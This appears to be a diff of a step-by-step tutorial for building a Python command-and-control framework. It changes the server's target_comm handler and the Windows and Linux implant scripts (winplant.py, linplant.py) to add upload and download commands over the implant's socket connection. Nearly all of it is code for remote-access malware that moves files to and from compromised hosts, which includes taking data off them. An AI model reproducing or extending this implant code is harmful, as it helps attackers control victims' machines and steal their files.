@@ -16,22 +16,21 @@ from functions.transfer import upload_file, download_file
 ```
 3. Inside of the target_comm function of the main script, add the following
 ```
-            elif message[:7] == 'upload ':
-                filename = message[7:]
-                filename = os.path.basename(filename)
-                upload_file(filename)
-            elif message[:9] == 'download ':
-                filename = message[9:]
-                print(filename)
-                try:
-                    if os.path.exists(filename):
-                        download_file(filename)
-                    else:
-                        response = '0'
-                        response = bytes((response), encoding='utf8')
-                        secure_sock.send(response)
-                except FileNotFoundError:
-                    pass
+        elif message[:7] == 'upload ':
+            file_name = message[7:]
+            try:
+                if os.path.exists(file_name):
+                    upload_file(targ_id, file_name)
+                else:
+                    print(
+                        fail + '[-] File does not exist on the local machine.' + close)
+            except Exception as e:
+                print(e)
+        elif message[:9] == 'download ':
+            file_name = message[9:]
+            file_name = os.path.basename(file_name)
+            print(info + f'[+] Attempting to download {file_name}.' + close)
+            download_file(targ_id, file_name)
 ```
 3. Inside of both the winplant.py and linplant.py files, add the following functions:
 ```
@@ -74,7 +73,16 @@ def download_file(file_name):
                 upload_file(filename)
             elif message[:9] == 'download ':
                 filename = message[9:]
-                download_file(filename)
+                print(filename)
+                try:
+                    if os.path.exists(filename):
+                        download_file(filename)
+                    else:
+                        response = '0'
+                        response = bytes((response), encoding='utf8')
+                        secure_sock.send(response)
+                except FileNotFoundError:
+                    pass
 ```
 
 ### Functionality 
